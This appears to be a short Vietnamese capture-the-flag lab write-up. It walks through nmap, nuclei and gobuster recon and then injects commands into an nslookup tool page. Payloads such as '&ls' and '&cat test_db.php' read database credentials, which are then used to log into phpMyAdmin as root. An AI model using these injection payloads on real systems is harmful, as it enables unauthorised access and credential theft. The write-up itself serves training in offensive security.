# Mục tiêu: Khai thác dịch vụ mở ra không cần thiết
# lab
Sử dụng `namp` để xem có những port service nào đang hoạt động
```
nmap -sC -sV -A -p- shop.xx.xxx
```
- Phát hiện port `8080` của phpMyAdmin
- `nslookup` lấy ip

a domain
- `curl -v ip`
Khi curl phát hiện ra 1 host mới.  
`curl -v cms.xx.xx` lỗi `resolve host`  ->  ta thử fix host trong `/etc/hosts` `echo "192.168.1.1 cms.xxx.xxx" >> /etc/hosts`.  
Tiếp tục sử dụng `nuclei -u http://cms.xxx.xxx` và `gobuster dir  --url http://cms.xxx.xxx -w wordlists/fuzz-Bo0oM.txt -t 70` để recon  
phát hiện thêm path `tools.php` và `upload`.  
Truy cập vào `/tools.php` thấy đây là 1 chạy lệnh `nslookup`:
- `;ls` để chạy nslookup trước rồi chạy `ls` nhưng bị báo lỗi hack --> bỏ `;`
- `&ls` thì chạy vậy là chạy cả hai cùng lúc --> done
- Trước đó ta biết ở ngoài url có và trức năng test connect đến db là `test_db.php, test_db_pdo.php`.
- khi dùng `&ls` tại thư mục hiện tại thì cũng có nhưng file như trên sử dụng lệnh `&cat test_db.php`, thấy có user pass root --> thử đăng nhập vào phpMyAdmin thì thành công.
- mò trong db thì cũng có 1 flag
- tiếp tục khám phá `&ls /` vô tình lại tìm được flag ở `/root`. lv3